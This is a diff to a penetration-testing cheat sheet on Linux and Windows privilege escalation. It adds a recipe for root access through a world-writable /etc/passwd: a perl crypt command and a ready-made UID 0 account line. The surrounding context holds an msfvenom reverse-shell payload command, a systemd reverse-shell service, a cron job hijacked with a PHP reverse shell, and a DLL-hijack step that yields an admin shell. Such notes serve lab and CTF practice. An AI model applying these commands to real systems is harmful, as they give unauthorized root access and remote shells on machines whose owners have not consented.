@@ -134,6 +134,11 @@ systemctl start revshell.service
 ```
 After it runs successfully you will get reverse shell back to kali.
 
+### /etc/passwd world writable
+* Simply appending in /etc/passwd and making the UID 0 will provide you the root access to system. 
+* Generate the password:  perl -le 'print crypt("foo", "aa")'
+to set the password to foo.
+* daya:aaKNIEDOaueR6:0:0:daya:/tmp/daya:/bin/bash
 ### Useful Commands:
 msfvenom -p windows/shell_reverse_tcp -a x86 --encoder /x86/shikata_ga_nai LHOST=[your_ip] LPORT=[listening_port] -f exe -o [shell_name.exe]
 
@@ -147,11 +152,11 @@ Eg. * * * * *	root	php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
 
 In this case you can simply replace the /var/www/laravel/artisan file with one liner php reverse shell.
 
-### Windows Privilege Escalation
-## Iperius Backup 6.1.0 - Privilege Escalation
+## Windows Privilege Escalation
+### Iperius Backup 6.1.0 - Privilege Escalation
 Scenario: On a VNC accessible machine this service is running. Use the exploit [46863](https://www.exploit-db.com/exploits/46863) in exploitdb.
 
-## SystemScheduler
+### SystemScheduler
 Inside c:\Program Files (x86)\SystemScheduler we can found a list of application scheduled. It is observed that details logs in c:\Program Files (x86)\SystemScheduler/events. 08/29/2020  07:15 AM            16,107 20198415519.INI_LOG.txt Here in this scenario, message.exe we can overwrite it. Possible DLL hijacking. Create shell.exe and overwrite message.exe with shell.exe. You will get admin reverse shell.
 
 ### Jekyll Themes
